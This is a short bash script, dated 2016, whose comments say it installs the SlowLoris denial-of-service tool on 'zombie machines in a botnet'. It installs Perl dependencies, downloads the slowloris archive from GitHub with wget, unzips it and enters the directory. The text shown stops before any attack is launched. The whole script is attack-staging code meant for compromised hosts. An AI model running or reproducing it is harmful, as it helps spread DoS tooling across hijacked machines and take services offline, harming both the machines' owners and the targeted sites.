#! /bin/bash

# Script to download, setup & install SlowLoris DoS attack vector
# on zombie machines in a botnet

# Author: Kadar M. Anwar
# Date: 11-7-2016

echo "========================"
echo   "Installing Software"
echo "========================"
echo ""
echo ""
sleep 1

apt-get install unzip perl-doc libhtml-parser-perl libio-socket-ssl-perl -y

echo "========================"
echo   "Downloading SlowLoris"
echo "========================"
echo ""
echo ""
sleep 1

wget https://github.com/llaera/slowloris.pl/archive/master.zip
unzip master.zip
cd slowloris.pl-master/
